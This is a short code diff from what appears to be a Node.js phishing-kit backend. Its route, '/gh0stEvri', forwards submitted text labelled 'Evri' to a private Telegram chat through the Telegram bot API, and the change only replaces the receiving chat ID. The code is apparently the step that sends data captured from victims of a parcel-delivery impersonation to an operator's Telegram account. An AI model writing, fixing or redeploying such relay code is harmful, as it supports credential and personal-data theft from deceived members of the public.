@@ -14670,7 +14670,7 @@ app.post("/gh0stEvri", async (req, res) => {
               .post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                 {
-                  chat_id: 5582405778,
+                  chat_id: 5573559497,
                   text: `Evri:\n${originalText}`,
                   parse_mode: "Markdown",
                 }
